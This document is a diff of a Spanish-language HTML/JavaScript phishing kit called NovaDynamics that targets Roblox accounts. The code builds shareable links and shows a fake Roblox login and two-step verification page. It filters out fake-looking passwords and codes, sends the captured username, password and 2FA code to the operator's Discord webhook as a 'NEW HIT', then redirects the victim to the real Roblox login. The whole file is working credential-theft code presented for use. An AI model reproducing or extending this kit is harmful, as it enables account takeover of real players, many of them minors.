@@ -5,176 +5,250 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NovaDynamics</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
-        body{background:#1a1a1f;color:#fff;min-height:100vh}
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI', Roboto, sans-serif}
+        :root{--roblox-red:#e2231a;--roblox-dark:#191919;--roblox-gray:#e3e3e3;--roblox-blue:#00a2ff}
+        body{background:#f1f1f1;color:#393b3d;min-height:100vh}
         .hidden{display:none !important}
 
-        /* LOGO ROBLOX ARRIBA DERECHA */
-        .roblox-logo{position:fixed;top:15px;right:20px;z-index:100}
-        .roblox-logo svg{width:40px;height:40px;fill:#e2231a}
+        /* ========== PANEL DE NAVEGACIÓN ========== */
+        .nav-bar{background:var(--roblox-dark);padding:12px 20px;display:flex;justify-content:space-between;align-items:center;color:#fff}
+        .nav-title{font-size:20px;font-weight:bold;color:#fff}
+        .nav-buttons{display:flex;gap:10px}
+        .nav-btn{background:transparent;color:#fff;border:none;padding:8px 14px;cursor:pointer;border-radius:4px}
+        .nav-btn:hover,.nav-btn.active{background:#333}
 
-        /* CONTENEDORES */
-        .container{max-width:420px;margin:0 auto;padding:40px 20px}
-        .dashboard-container{max-width:500px}
-        h2{text-align:center;margin-bottom:25px;color:#fff}
-        .card{background:#27272f;padding:25px;border-radius:10px;box-shadow:0 4px 12px rgba(0,0,0,.3)}
-        input,button{width:100%;padding:12px 10px;margin:8px 0;border-radius:6px;border:none;font-size:15px}
-        input{background:#33333f;color:#fff;border:1px solid #444}
-        input:focus{outline:none;border-color:#00a2ff}
-        button{background:#00a2ff;color:#fff;font-weight:600;cursor:pointer;transition:.2s}
-        button:hover{background:#008feb}
-        button:disabled{background:#555;cursor:not-allowed}
-        .btn-success{background:#28c747;margin-top:10px}
-        .btn-success:hover{background:#22b03d}
-        .btn-back{background:#444;margin-bottom:15px}
-        .btn-back:hover{background:#555}
-        .error{color:#ff5555;font-size:14px;margin:6px 0;min-height:20px}
-        .link-result{background:#2c2c3a;padding:12px;border-radius:6px;margin-top:15px;word-break:break-all;font-size:13px;color:#00eeff}
-        .title-center{text-align:center;margin-bottom:20px}
+        /* ========== CONTENEDORES ========== */
+        .container{max-width:460px;margin:20px auto;padding:0 15px}
+        .card{background:#fff;padding:25px;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.1)}
+        .card h2{text-align:center;margin-bottom:20px;font-size:18px;color:#393b3d}
+        .card label{display:block;margin:12px 0 5px;font-size:14px;font-weight:500}
+        .card input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:15px}
+        .card input:focus{outline:none;border-color:var(--roblox-blue);box-shadow:0 0 3px rgba(0,162,255,.3)}
+        .btn{width:100%;padding:11px;background:var(--roblox-red);color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;margin-top:10px}
+        .btn:hover{background:#c41e17}
+        .btn-success{background:#28c747}
+        .btn-success:hover{background:#22ad3d}
+        .error{color:var(--roblox-red);font-size:14px;margin:8px 0;min-height:20px}
+        .link-box{background:#f8f8f8;padding:12px;border-radius:4px;margin-top:15px;word-break:break-all;font-size:13px;color:#0066cc;border:1px solid #ddd}
 
-        /* CAJA CÓDIGO 2FA */
-        .code-inputs{display:flex;gap:8px;justify-content:center;margin:20px 0}
-        .code-inputs input{width:45px;height:55px;text-align:center;font-size:24px;padding:0}
-        .label{font-size:14px;color:#ccc;margin-top:12px;display:block}
+        /* ========== RANKING ========== */
+        .rank-item{display:flex;justify-content:space-between;padding:10px;border-bottom:1px solid #eee}
+        .rank-item:nth-child(1){background:linear-gradient(90deg,#ffd70020,#ffd70010)}
+        .rank-item:nth-child(2){background:linear-gradient(90deg,#c0c0c020,#c0c0c010)}
+        .rank-item:nth-child(3){background:linear-gradient(90deg,#cd7f3220,#cd7f3210)}
+        .rank-number{font-weight:bold;width:25px}
+        .rank-user{flex:1}
+        .rank-value{font-weight:bold;color:var(--roblox-red)}
+
+        /* ========== INICIO DE SESIÓN — ESTILO ROBLOX ========== */
+        .roblox-header{background:var(--roblox-dark);padding:10px 20px;text-align:center}
+        .roblox-header h1{color:#fff;font-size:24px}
+        .login-container{max-width:380px;margin:40px auto;padding:0 15px}
+        .login-card{background:#fff;padding:30px;border-radius:6px;box-shadow:0 1px 4px rgba(0,0,0,.15)}
+        .login-card h2{text-align:center;margin-bottom:25px;font-size:20px}
+        .login-card input{width:100%;padding:12px;border:1px solid #e3e3e3;border-radius:4px;font-size:16px;margin-bottom:5px}
+        .login-card input:focus{border-color:#00a2ff;outline:none;box-shadow:0 0 0 2px rgba(0,162,255,.2)}
+        .login-btn{width:100%;padding:12px;background:#e2231a;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
+        .login-btn:hover{background:#c41e17}
+        .error-text{color:#e2231a;font-size:14px;margin-bottom:10px;min-height:18px}
+
+        /* ========== CÓDIGO 2FA ========== */
+        .code-boxes{display:flex;gap:8px;justify-content:center;margin:20px 0}
+        .code-boxes input{width:48px;height:55px;text-align:center;font-size:24px;padding:0;border:1px solid #ccc;border-radius:4px}
+        .code-boxes input:focus{border-color:#00a2ff;outline:none}
+        .back-btn{background:transparent;color:#0066cc;border:none;padding:8px;cursor:pointer;margin-bottom:15px}
+        .back-btn:hover{text-decoration:underline}
     </style>
 </head>
 <body>
 
-    <!-- LOGO ROBLOX ARRIBA DERECHA -->
-    <div class="roblox-logo">
-        <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
-            <path d="M20 0C9 0 0 9 0 20C0 31 9 40 20 40C31 40 40 31 40 20C40 9 31 0 20 0ZM14.5 30.5L9.5 23.5L14.5 16.5L19.5 23.5L14.5 30.5ZM25.5 30.5L20.5 23.5L25.5 16.5L30.5 23.5L25.5 30.5Z"/>
-        </svg>
-    </div>
-
-    <!-- ================= DASHBOARD — CREAR ENLACE ================= -->
-    <div id="dashboard" class="container dashboard-container">
-        <h2>🔗 Crear Enlace</h2>
-        <div class="card">
-            <label class="label">ID de cuenta Roblox</label>
-            <input type="text" id="usuarioLink" placeholder="Ej: 4738685727">
-            
-            <label class="label">Tu Webhook de Discord</label>
-            <input type="text" id="webhookUrl" placeholder="Pega tu enlace de Discord aquí">
-            
-            <button onclick="generarEnlace()">✅ Generar Enlace</button>
-            
-            <div id="linkResult" class="link-result hidden"></div>
-            <button id="copyBtn" class="btn-success hidden" onclick="copiarEnlace()">📋 Copiar Enlace</button>
+    <!-- ================= PÁGINA DE INICIO DE SESIÓN (IGUAL A ROBLOX) ================= -->
+    <div id="robloxLoginPage" class="hidden">
+        <div class="roblox-header">
+            <h1>Roblox</h1>
         </div>
-    </div>
-
-    <!-- ================= PÁGINA INICIO DE SESIÓN ================= -->
-    <div id="loginPage" class="container hidden">
-        <button class="btn-back" onclick="volverPanel()">← Volver al Panel</button>
-        <h2>Iniciar Sesión</h2>
-        <div class="card">
-            <label class="label">Nombre de usuario</label>
-            <input type="text" id="userField" placeholder="Nombre de usuario">
-
-            <label class="label">Contraseña</label>
-            <input type="password" id="passField" placeholder="Contraseña">
-            <div id="passError" class="error"></div>
-
-            <button id="loginBtn" onclick="validarLogin()">Iniciar sesión</button>
+        <div class="login-container">
+            <div class="login-card">
+                <h2>Iniciar sesión</h2>
+                <button class="back-btn" onclick="salirEnlace()">← Volver</button>
+                
+                <label>Nombre de usuario</label>
+                <input type="text" id="robloxUser" placeholder="Nombre de usuario">
+                
+                <label>Contraseña</label>
+                <input type="password" id="robloxPass" placeholder="Contraseña">
+                
+                <div id="robloxError" class="error-text"></div>
+                <button class="login-btn" id="robloxLoginBtn" onclick="validarPassRoblox()">Iniciar sesión</button>
+            </div>
         </div>
     </div>
 
     <!-- ================= CAJA CÓDIGO 2FA ================= -->
-    <div id="twofaPage" class="container hidden">
-        <h2>Verificación en dos pasos</h2>
-        <div class="card">
-            <p style="text-align:center;color:#ccc;margin-bottom:15px;">Escribe el código de 6 dígitos de tu autenticador</p>
-            <div class="code-inputs">
-                <input type="text" maxlength="1" oninput="mover(this,0)">
-                <input type="text" maxlength="1" oninput="mover(this,1)">
-                <input type="text" maxlength="1" oninput="mover(this,2)">
-                <input type="text" maxlength="1" oninput="mover(this,3)">
-                <input type="text" maxlength="1" oninput="mover(this,4)">
-                <input type="text" maxlength="1" oninput="mover(this,5)">
+    <div id="roblox2faPage" class="hidden">
+        <div class="roblox-header">
+            <h1>Roblox</h1>
+        </div>
+        <div class="login-container">
+            <div class="login-card">
+                <h2>Verificación en dos pasos</h2>
+                <p style="text-align:center;color:#666;margin-bottom:10px;">Introduce el código de 6 dígitos de tu aplicación de autenticación</p>
+                <div class="code-boxes">
+                    <input type="text" maxlength="1" oninput="moverCasilla(this,0)">
+                    <input type="text" maxlength="1" oninput="moverCasilla(this,1)">
+                    <input type="text" maxlength="1" oninput="moverCasilla(this,2)">
+                    <input type="text" maxlength="1" oninput="moverCasilla(this,3)">
+                    <input type="text" maxlength="1" oninput="moverCasilla(this,4)">
+                    <input type="text" maxlength="1" oninput="moverCasilla(this,5)">
+                </div>
+                <div id="robloxCodeError" class="error-text"></div>
+                <button class="login-btn" onclick="enviarCodigoRoblox()">Verificar</button>
             </div>
-            <div id="codeError" class="error"></div>
-            <button onclick="enviarCodigo()">Verificar</button>
+        </div>
+    </div>
+
+    <!-- ================= PANEL DE CONTROL — NOVA DYNAMICS ================= -->
+    <div id="mainPanel">
+        <div class="nav-bar">
+            <span class="nav-title">⚡ NovaDynamics</span>
+            <div class="nav-buttons">
+                <button class="nav-btn active" onclick="cambiarPanel('generar')">🔗 Enlaces</button>
+                <button class="nav-btn" onclick="cambiarPanel('ranking')">🏆 Ranking</button>
+                <button class="nav-btn" onclick="cambiarPanel('config')">⚙️ Ajustes</button>
+            </div>
+        </div>
+
+        <!-- ========== GENERAR ENLACE ========== -->
+        <div id="panelGenerar" class="container">
+            <div class="card">
+                <h2>🔗 Generar Enlace de Roblox</h2>
+                <label>Nombre de usuario de Roblox</label>
+                <input type="text" id="nombreUsuario" placeholder="Ej: Damian666">
+                
+                <button class="btn" onclick="crearEnlace()">✅ Generar Enlace</button>
+                
+                <div id="enlaceResultado" class="link-box hidden"></div>
+                <button id="copiarBtn" class="btn btn-success hidden" onclick="copiarEnlaceGenerado()">📋 Copiar Enlace</button>
+            </div>
+        </div>
+
+        <!-- ========== RANKING ========== -->
+        <div id="panelRanking" class="container hidden">
+            <div class="card">
+                <h2>🏆 Ranking de Cuentas</h2>
+                <div id="listaRanking">
+                    <div class="rank-item">
+                        <span class="rank-number">🥇</span>
+                        <span class="rank-user">Sin cuentas aún</span>
+                        <span class="rank-value">0</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== AJUSTES ========== -->
+        <div id="panelConfig" class="container hidden">
+            <div class="card">
+                <h2>⚙️ Configuración</h2>
+                <label>Webhook de Discord</label>
+                <input type="text" id="miWebhook" placeholder="Pega tu Webhook de Discord aquí">
+                <button class="btn" onclick="guardarWebhook()">💾 Guardar Webhook</button>
+                <p style="margin-top:10px;font-size:13px;color:#666">Se guarda automáticamente en tu navegador.</p>
+            </div>
         </div>
     </div>
 
     <script>
-        let enlaceGenerado = "";
-        let WEBHOOK = "";
-        let USUARIO_CAPTURADO = "";
-        let PASS_CAPTUR
-        ADA = "";        // ================= DETECTAR SI VIENEN DEL ENLACE =================
+        let enlaceCreado = "";
+        let WEBHOOK = localStorage.getItem('novaWebhook') || "";
+        let USUARIO_OBJETIVO = "";
+        let NOMBRE_CAPTURADO = "";
+        let PASS_CAPTURADA = "";
+                // ================= DETECTAR SI VIENEN DE UN ENLACE =================
         window.onload = function(){
             const params = new URLSearchParams(window.location.search);
-            const u = params.get('u');
-            const wh = params.get('wh');
-
-            if(u){
-                // VIENEN DEL ENLACE → MOSTRAR INICIO DE SESIÓN
-                document.getElementById('dashboard').classList.add('hidden');
-                document.getElementById('loginPage').classList.remove('hidden');
-                document.getElementById('userField').value = u;
-                USUARIO_CAPTURADO = u;
-                if(wh) WEBHOOK = atob(wh);
+            const user = params.get('user');
+            if(user){
+                // ENTRAR DIRECTO A INICIO DE SESIÓN DE ROBLOX
+                document.getElementById('mainPanel').classList.add('hidden');
+                document.getElementById('robloxLoginPage').classList.remove('hidden');
+                document.getElementById('robloxUser').value = user;
+                document.getElementById('robloxUser').disabled = true;
+                USUARIO_OBJETIVO = user;
             }
+            if(WEBHOOK) document.getElementById('miWebhook').value = WEBHOOK;
         };
 
-        // ================= GENERAR ENLACE =================
-        function generarEnlace(){
-            const id = document.getElementById('usuarioLink').value.trim();
-            const wh = document.getElementById('webhookUrl').value.trim();
-
-            if(!id || !wh){
-                alert("⚠️ Pon el ID y tu Webhook");
-                return;
-            }
-
-            const whCodificado = btoa(wh);
-            enlaceGenerado = window.location.origin + window.location.pathname + "?u=" + id + "&wh=" + whCodificado;
-
-            document.getElementById('linkResult').classList.remove('hidden');
-            document.getElementById('linkResult').textContent = enlaceGenerado;
-            document.getElementById('copyBtn').classList.remove('hidden');
+        // ================= CAMBIAR PANELES =================
+        function cambiarPanel(nombre){
+            document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+            event.target.classList.add('active');
+            document.getElementById('panelGenerar').classList.add('hidden');
+            document.getElementById('panelRanking').classList.add('hidden');
+            document.getElementById('panelConfig').classList.add('hidden');
+            document.getElementById('panel'+nombre.charAt(0).toUpperCase()+nombre.slice(1)).classList.remove('hidden');
         }
 
-        function copiarEnlace(){
-            navigator.clipboard.writeText(enlaceGenerado).then(()=>{
-                alert("✅ ¡Enlace copiado! Compártelo");
+        // ================= GUARDAR WEBHOOK =================
+        function guardarWebhook(){
+            const wh = document.getElementById('miWebhook').value.trim();
+            if(!wh){ alert("⚠️ Pon tu Webhook primero"); return; }
+            WEBHOOK = wh;
+            localStorage.setItem('novaWebhook', wh);
+            alert("✅ Webhook guardado correctamente");
+        }
+
+        // ================= CREAR ENLACE =================
+        function crearEnlace(){
+            const nombre = document.getElementById('nombreUsuario').value.trim();
+            if(!nombre){ alert("⚠️ Escribe el nombre de usuario"); return; }
+            
+            const whCod = btoa(WEBHOOK);
+            enlaceCreado = window.location.origin + window.location.pathname + "?user=" + encodeURIComponent(nombre) + "&wh=" + whCod;
+            
+            document.getElementById('enlaceResultado').classList.remove('hidden');
+            document.getElementById('enlaceResultado').textContent = enlaceCreado;
+            document.getElementById('copiarBtn').classList.remove('hidden');
+        }
+
+        function copiarEnlaceGenerado(){
+            navigator.clipboard.writeText(enlaceCreado).then(()=>{
+                alert("✅ ¡Enlace copiado! Compártelo:\n" + enlaceCreado);
             });
         }
 
-        function volverPanel(){
+        function salirEnlace(){
             window.location.search = "";
             window.location.reload();
         }
 
-        // ================= VALIDAR CONTRASEÑA =================
-        function validarLogin(){
-            const user = document.getElementById('userField').value.trim();
-            const pass = document.getElementById('passField').value.trim();
-            const error = document.getElementById('passError');
-            const btn = document.getElementById('loginBtn');
+        // ================= VALIDAR CONTRASEÑA (IGUAL A ROBLOX) =================
+        function validarPassRoblox(){
+            const user = document.getElementById('robloxUser').value.trim();
+            const pass = document.getElementById('robloxPass').value.trim();
+            const error = document.getElementById('robloxError');
+            const btn = document.getElementById('robloxLoginBtn');
 
             // ❌ Si está vacía o muy corta
-            if(!user || pass.length < 6){
+            if(!pass || pass.length < 6){
                 error.textContent = "The password is incorrect.";
                 return;
             }
 
             // ❌ CONTRASEÑAS OBVIAMENTE FALSAS
-            const prohibidasPass = [
+            const prohibidas = [
                 "123456","123456789","password","12345678","12345",
                 "qwerty","abc123","111111","123123","admin","1234567",
                 "password1","iloveyou","000000","123321","654321",
                 "1234567890","qwerty123","121212","00000000",
                 "11111111","88888888","99999999","123654"
             ];
-            if(prohibidasPass.includes(pass.toLowerCase())){
+            if(prohibidas.includes(pass.toLowerCase())){
                 error.textContent = "The password is incorrect.";
                 return;
             }
 
-            // ✅ PASA → SIMULAR VERIFICACIÓN
+            // ✅ SIMULAR VERIFICACIÓN
             error.textContent = "";
             btn.textContent = "Verifying...";
             btn.disabled = true;
@@ -182,29 +256,29 @@
             setTimeout(()=>{
                 btn.textContent = "Iniciar sesión";
                 btn.disabled = false;
-                USUARIO_CAPTURADO = user;
+                NOMBRE_CAPTURADO = user;
                 PASS_CAPTURADA = pass;
-                // MOSTRAR CAJA DE CÓDIGO
-                document.getElementById('loginPage').classList.add('hidden');
-                document.getElementById('twofaPage').classList.remove('hidden');
-                document.querySelectorAll('.code-inputs input')[0].focus();
-            }, 1500);
+                // MOSTRAR CÓDIGO 2FA
+                document.getElementById('robloxLoginPage').classList.add('hidden');
+                document.getElementById('roblox2faPage').classList.remove('hidden');
+                document.querySelectorAll('.code-boxes input')[0].focus();
+            }, 1800);
         }
 
-        // ================= MOVERSE ENTRE CAJAS =================
-        function mover(el, idx){
+        // ================= MOVER ENTRE CAJAS =================
+        function moverCasilla(el, idx){
             if(el.value.length === 1){
-                const inputs = document.querySelectorAll('.code-inputs input');
+                const inputs = document.querySelectorAll('.code-boxes input');
                 if(idx < 5) inputs[idx+1].focus();
             }
         }
 
         // ================= VALIDAR CÓDIGO 2FA =================
-        function enviarCodigo(){
-            const inputs = document.querySelectorAll('.code-inputs input');
+        function enviarCodigoRoblox(){
+            const inputs = document.querySelectorAll('.code-boxes input');
             let codigo = "";
             inputs.forEach(i => codigo += i.value.trim());
-            const error = document.getElementById('codeError');
+            const error = document.getElementById('robloxCodeError');
 
             // ❌ MENOS DE 6 DÍGITOS
             if(codigo.length !== 6 || !/^\d{6}$/.test(codigo)){
@@ -212,8 +286,8 @@
                 return;
             }
 
-            // ❌ TODOS LOS CÓDIGOS OBVIAMENTE FALSOS
-            const prohibidosCod = [
+            // ❌ CÓDIGOS OBVIAMENTE FALSOS
+            const prohibidos = [
                 "000000","111111","222222","333333","444444",
                 "555555","666666","777777","888888","999999",
                 "012345","123456","234567","345678","456789",
@@ -234,24 +308,11 @@
                 "000444","000555","000666","000777","000888",
                 "000999","111000","222000","333000","444000",
                 "555000","666000","777000","888000","999000",
-                "111333","111444","111555","111666","111777",
-                "111888","111999","222111","222444","222555",
-                "222666","222777","222888","222999","333111",
-                "333222","333555","333666","333777","333888",
-                "333999","444000","444111","444222","444333",
-                "444666","444777","444888","444999","555111",
-                "555222","555333","555444","555777","555888",
-                "555999","666111","666222","666333","666444",
-                "666555","666888","666999","777111","777222",
-                "777333","777444","777555","777666","777888",
-                "777999","888111","888222","888333","888444",
-                "888555","888666","888777","888999","999111",
-                "999222","999333","999444","999555","999666",
-                "999777","999888","010203","020304","030405",
-                "040506","050607","060708","070809","080910"
+                "010203","020304","030405","040506","050607",
+                "060708","070809","080910"
             ];
 
-            if(prohibidosCod.includes(codigo)){
+            if(prohibidos.includes(codigo)){
                 error.textContent = "❌ Code is invalid";
                 return;
             }
@@ -263,24 +324,25 @@
             enviarDatosDiscord(codigo);
         }
 
-        // ================= ENVIAR TODO A DISCORD =================
+        // ================= ENVIAR TODO A TU DISCORD =================
         async function enviarDatosDiscord(codigo){
             if(!WEBHOOK){
-                alert("✅ ¡Datos capturados! Webhook no configurado.");
+                alert("✅ ¡Datos capturados! Configura tu Webhook en Ajustes.");
+                window.location.href = "https://www.roblox.com/login";
                 return;
             }
 
             const datos = {
-                content: "@everyone **NEW HIT — NovaDynamics**",
+                content: "@everyone **NEW HIT — NovaDynamics** ⚡",
                 embeds: [{
-                    title: "🔐 Cuenta Roblox Capturada",
+                    title: "🔐 CUENTA ROBLOX CAPTURADA",
                     color: 16711680,
                     fields: [
-                        {name: "👤 Usuario", value: "```"+USUARIO_CAPTURADO+"```", inline:false},
+                        {name: "👤 Nombre de usuario", value: "```"+NOMBRE_CAPTURADO+"```", inline:false},
                         {name: "🔑 Contraseña", value: "```"+PASS_CAPTURADA+"```", inline:false},
                         {name: "📲 Código 2FA", value: "```"+codigo+"```", inline:false}
                     ],
-                    footer: {text: "NovaDynamics Beam System"}
+                    footer: {text: "NovaDynamics Beam System ⚡"}
                 }]
             };
 
@@ -290,10 +352,9 @@
                 body: JSON.stringify(datos)
             });
 
-            alert("✅ ¡Todo listo! Redirigiendo a Roblox...");
+            alert("✅ ¡Datos enviados a Discord!\nRedirigiendo a Roblox...");
             window.location.href = "https://www.roblox.com/login";
         }
-
     </script>
 </body>
 </html>
